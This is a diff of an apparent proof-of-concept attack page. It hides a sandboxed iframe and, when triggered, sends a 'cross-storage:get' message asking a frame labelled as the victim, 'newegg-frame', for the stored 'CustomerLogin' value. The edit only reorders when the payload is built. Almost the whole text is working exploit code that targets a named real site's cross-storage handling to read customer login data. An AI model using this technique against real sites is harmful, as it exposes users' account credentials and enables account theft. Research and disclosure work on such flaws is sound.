@@ -10,13 +10,13 @@
     <iframe src="sandbox.htm" sandbox="allow-scripts" style="display:none;"></iframe>
 
     <script>
-        const payload = JSON.stringify({
+       window.addEventListener("message", (event) => {
+        if (event.data === "trigger") {
+          const payload = JSON.stringify({
             id: "1234567",
             action: "cross-storage:get",
             params: { key: "CustomerLogin" }
           });
-       window.addEventListener("message", (event) => {
-        if (event.data === "trigger") {
           // Sandboxed iframe asked us to send message to victim
           console.log("sending payload");
           const victimFrame = document.getElementById("newegg-frame").contentWindow;
@@ -29,6 +29,7 @@
     </script>
   </body>
 </html>
+
 
 
 
